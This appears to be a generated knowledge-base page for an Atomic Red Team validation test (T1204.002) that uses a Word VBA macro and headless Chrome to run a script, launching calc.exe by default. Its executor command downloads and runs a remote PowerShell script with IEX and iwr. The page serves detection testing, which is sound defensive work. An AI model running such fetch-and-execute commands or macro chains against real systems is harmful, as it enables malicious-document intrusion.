---
atomic_guid: "a19ee671-ed98-4e9d-b19c-d1954a51585a"
title: "Headless Chrome code execution via VBA"
framework: "atomic"
generated: "true"
attack_technique_id: "T1204.002"
attack_technique_name: "User Execution: Malicious File"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "a19ee671-ed98-4e9d-b19c-d1954a51585a"
  - "Headless Chrome code execution via VBA"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local
webserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver
and pull down the script and execute it. By default the payload will execute calc.exe on the system.

## ATT&CK Mapping

- [[kb/attack/techniques/T1204-user_execution#^t1204002-malicious-file|T1204.002: Malicious File]]

## Dependencies

Microsoft Word must be installed

### Prerequisite Check

```powershell
try {
  $wdApp = New-Object -COMObject "Word.Application"
  Stop-Process -Name "winword"
  exit 0 } catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
```

Google Chrome must be installed

### Prerequisite Check

```powershell
try {
  $chromeInstalled = (Get-Item (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe').'(Default)').VersionInfo.FileName
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Google Chrome manually to meet this requirement"
```

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
```

### Cleanup

```powershell
Stop-Process -name mshta
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml)
